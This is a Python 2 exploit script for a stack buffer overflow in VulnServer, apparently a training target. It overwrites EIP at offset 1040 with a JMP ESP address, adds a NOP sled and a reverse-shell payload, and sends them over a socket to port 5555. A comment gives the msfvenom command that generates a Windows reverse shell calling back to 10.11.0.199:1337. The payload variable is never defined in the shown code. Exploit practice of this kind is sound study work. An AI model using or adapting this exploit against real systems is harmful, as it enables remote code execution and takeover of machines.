#!/usr/bin/python
#---------------------------------------------------------------------------------------------#
# Software      = VulnServer                                                                  #
# Date          = 9/13/2017                                                                   #
# Tested on     = Windows 7 - Professional N SP1                                              #
# EIP Offset    = 1040                                                                        #
# Badchars      = None                                                                        #
# RET Address   = 0x65d11d71 : "\xFF\xE4" | [VulnServer.exe]                                  #
# Usage         = python exploit.py <target IP>                                               #        
#---------------------------------------------------------------------------------------------#

import sys
import socket
import time
import struct
import subprocess

#---------------#---------#  
W  = '\033[0m'  # White   #
R  = '\033[31m' # Red     #
G  = '\033[32m' # Green   #
O  = '\033[33m' # Orange  #
B  = '\033[34m' # Blue    #
P  = '\033[35m' # Purple  #
C  = '\033[36m' # Cyan    #
M  = '\033[35m' # Magenta #
Y  = '\033[33m' # Yellow  #
#---------------#---------#


if len(sys.argv) < 2:
  print Y+ "Usage               :" + P+  " python exploit.py <target IP>" +W
  print Y+ "Example             :" + P+  " python exploit.py 127.0.0.1  " +W
  sys.exit(0)

HOST     = sys.argv[1]
  
#-------------------------------------------------------------------------------------------------------#
# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.199 LPORT=1337 -b "\x00\x0a" -f python -v payload #
#-------------------------------------------------------------------------------------------------------#


#----------------------------#
#      Buffer Structure      #
#----------------------------#
# buffer = "AUTH "           #
# buffer = AAA...........AAA #
# buffer = EIP               #
# buffer = NOPSled           #
# buffer = payload           #
# buffer = BBB...........BBB #
#----------------------------#


buffer =  "AUTH "
buffer += "A" * 1040
buffer += struct.pack('<L', 0x65d11d71)
buffer += "\x90" * 20
buffer += payload
buffer += "B" * (1395-1040-4-20-len(payload))


try:
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((HOST, 5555))
  print G+ "[+]" +W + " Connected to VulnServer Server with IP: %s and port: 5555" %(HOST)
  print G+ "[+]" +W + " Sending %s bytes of evil payload" %len(buffer)
  time.sleep(2)
  s.send(buffer)
  data = s.recv(1024)
  print G+ "[+]" + P+ " Incoming shell on port 1337" + Y+ " <(^,^)>" +W

except Exception,msg:
  print R+ "[-]" + P+ " Could not connect to VulnServer Server" + Y+ " (._.)" +W
  sys.exit(0)

